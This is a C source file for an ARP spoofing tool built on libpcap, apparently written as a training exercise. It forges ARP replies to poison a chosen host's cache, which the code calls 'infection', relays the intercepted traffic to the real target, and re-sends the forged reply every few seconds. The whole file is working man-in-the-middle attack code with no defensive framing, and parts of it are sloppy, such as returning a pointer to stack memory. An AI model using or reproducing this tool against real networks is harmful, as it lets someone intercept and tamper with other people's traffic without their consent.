//sender target
#include "arp_spoofing.h"


void usage() {
  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
  printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

unsigned char* macMac(unsigned char *dev){
    int fd;
    unsigned char *mac;
    struct ifreq ifr;

    memset(&ifr, 0, sizeof(ifr));

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , dev , IFNAMSIZ-1);

    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr)) {
            mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    }

    close(fd);

    return mac;
}

void printPacket(u_char *packet){
    printf("PACKET\n");
    for(int j = 0 ; j< 42 ; j++){
        printf("%02x ", packet[j]);
        if(j % 16 == 15) printf("\n");
    }
    printf("\n");
    return;
}

unsigned char* makeArpPacket(char *sender){
    struct ether_header sender_eth;
    struct arp_header sender_arph;
    u_char * packet_t = (u_char *)malloc( 42 * sizeof(u_char));

    sender_eth.ether_dhost[0] = 0xff;
    sender_eth.ether_dhost[1] = 0xff;
    sender_eth.ether_dhost[2] = 0xff;
    sender_eth.ether_dhost[3] = 0xff;
    sender_eth.ether_dhost[4] = 0xff;
    sender_eth.ether_dhost[5] = 0xff;

    sender_eth.ether_shost[0] = My_MAC[0];
    sender_eth.ether_shost[1] = My_MAC[1];
    sender_eth.ether_shost[2] = My_MAC[2];
    sender_eth.ether_shost[3] = My_MAC[3];
    sender_eth.ether_shost[4] = My_MAC[4];
    sender_eth.ether_shost[5] = My_MAC[5];

    sender_eth.ether_type = ARP_TYPE;

    sender_arph.arp_htype = ETH_HW;
    sender_arph.arp_p = IPv4;
    sender_arph.arp_hsize = 0x06;
    sender_arph.arp_psize = 0x04;
    sender_arph.arp_opcode = ARP_REQ;

    sender_arph.arp_smhost[0] = My_MAC[0];
    sender_arph.arp_smhost[1] = My_MAC[1];
    sender_arph.arp_smhost[2] = My_MAC[2];
    sender_arph.arp_smhost[3] = My_MAC[3];
    sender_arph.arp_smhost[4] = My_MAC[4];
    sender_arph.arp_smhost[5] = My_MAC[5];

    sscanf(myIP, "%d.%d.%d.%d", &sender_arph.arp_sip[0], &sender_arph.arp_sip[1], &sender_arph.arp_sip[2], &sender_arph.arp_sip[3]);
    sender_arph.arp_dmhost[0] = 0x00;
    sender_arph.arp_dmhost[1] = 0x00;
    sender_arph.arp_dmhost[2] = 0x00;
    sender_arph.arp_dmhost[3] = 0x00;
    sender_arph.arp_dmhost[4] = 0x00;
    sender_arph.arp_dmhost[5] = 0x00;
    sscanf(sender, "%d.%d.%d.%d", &sender_arph.arp_dip[0], &sender_arph.arp_dip[1], &sender_arph.arp_dip[2], &sender_arph.arp_dip[3]);


    memcpy(packet_t, &sender_eth, sizeof(sender_eth));
    memcpy(packet_t + sizeof(sender_eth), &sender_arph, sizeof(sender_arph));
    return packet_t;
}




unsigned char* modifiedArpPacket(unsigned char *packet, char *targetIP){    //
    unsigned char *packet2 = (u_char *)malloc(42 * sizeof(u_char));
    struct arp_header sender_arph;
    memcpy(packet2, packet + 6, 6); //reverse mac addr
    memcpy(&packet2[6], packet, 6);
    memcpy(&packet2[12], packet + 12, 8);
    packet2[20] = 0x00; //reply
    packet2[21] = 0x02;
    memcpy(&packet2[22], packet + 32, 10);  //reverse mac addr and ip
    memcpy(&packet2[32], packet + 22, 10);
    sscanf(targetIP, "%d.%d.%d.%d", &sender_arph.arp_sip[0], &sender_arph.arp_sip[1], &sender_arph.arp_sip[2], &sender_arph.arp_sip[3]);
    memcpy(&packet2[28], &sender_arph.arp_sip, 4);
    return packet2;
}


u_char* infection(char *sender, char *target, struct ether_header *sender_mac ,pcap_t* handle, struct pcap_pkthdr* header, const u_char* packet){
    int res;
    u_char *tmp_packet;
    while(1){

        tmp_packet = makeArpPacket(sender); //request sender mac packet
        pcap_sendpacket(handle, tmp_packet, 42);
        free(tmp_packet);

        while(1){
            res = pcap_next_ex(handle, &header, &packet);
            if(res == 1)break;
        }

        if(packet[12] == 0x08 && packet[13] == 0x06){ //if arp
            //make fake packet
            tmp_packet = modifiedArpPacket(packet, target);
            printf("modifiied\n");
            memcpy(sender_mac->ether_dhost, tmp_packet, 6);


            pcap_sendpacket(handle, tmp_packet, 42);
            printf("Infection Sender\n");
            break;
        }

    }

    return tmp_packet;

}


void findTargetMac(char *target, struct ether_header *target_mac,pcap_t* handle, struct pcap_pkthdr* header, const u_char* packet){
    int res;
    u_char *tmp_packet;
    tmp_packet = makeArpPacket(target);
    pcap_sendpacket(handle, tmp_packet, 42);
    free(tmp_packet);

    while(1){
        res = pcap_next_ex(handle, &header, &packet);
        if(res == 1)break;
    }
    memcpy(target_mac->ether_dhost, packet + 6, 6);
    printf("Find Target mac\n");

}


void relayPacket(char *sender_mac, char *target_mac,pcap_t* handle, struct pcap_pkthdr* header, const u_char* packet){
    u_char *tmp_packet;
    pcap_next_ex(handle, &header, &packet);
    if(memcmp(packet, My_MAC, 6) == 0 && memcmp(packet+6, sender_mac, 6) == 0){
        if(memcmp(myIP, packet + 29, 4) == 0) return;
        tmp_packet = (u_char *)malloc(header->caplen * sizeof(u_char));
        memcpy(tmp_packet, packet, header->caplen);
        memcpy(tmp_packet, target_mac, 6);
        memcpy(tmp_packet + 6, My_MAC, 6);
        pcap_sendpacket(handle,tmp_packet, header->caplen);
        free(tmp_packet);
    }

}


void * t_fun(void* Session){
    pcap_t* handle;
    struct pcap_pkthdr* header;
    const u_char* packet;
    struct session *ptr = (struct session *)Session;
    int count = 0;

    char errbuf[PCAP_ERRBUF_SIZE];


    struct ether_header sender_mac;
    struct ether_header target_mac;

    const u_char* infectionPacket;


    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    printf("handle: %d\n", handle);

    if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
    }

    findTargetMac(ptr->target, &target_mac.ether_dhost, handle, header, packet);


    infectionPacket = infection(ptr->sender, ptr->target, &sender_mac.ether_dhost, handle, header, packet);



    while(1){
        count++;
        relayPacket(&sender_mac.ether_dhost, &target_mac.ether_dhost, handle, header, packet);
        printf("relay Packet --------------------------------------------\n");
        printf("sender mac : %02x:", sender_mac.ether_dhost[0]);
        printf("%02x:", sender_mac.ether_dhost[1]);
        printf("%02x:", sender_mac.ether_dhost[2]);
        printf("%02x:", sender_mac.ether_dhost[3]);
        printf("%02x:", sender_mac.ether_dhost[4]);
        printf("%02x", sender_mac.ether_dhost[5]);
        printf(" -->>  ");
        printf("target mac : %02x:", target_mac.ether_dhost[0]);
        printf("%02x:", target_mac.ether_dhost[1]);
        printf("%02x:", target_mac.ether_dhost[2]);
        printf("%02x:", target_mac.ether_dhost[3]);
        printf("%02x:", target_mac.ether_dhost[4]);
        printf("%02x\n", target_mac.ether_dhost[5]);
        printf("-----------------------------------------------------------\n");
        sleep(1);
        if(count == 10){
            pcap_sendpacket(handle,infectionPacket, 42);
            count = 0;
        }
    }

    free(infectionPacket);
    pcap_close(handle);
}






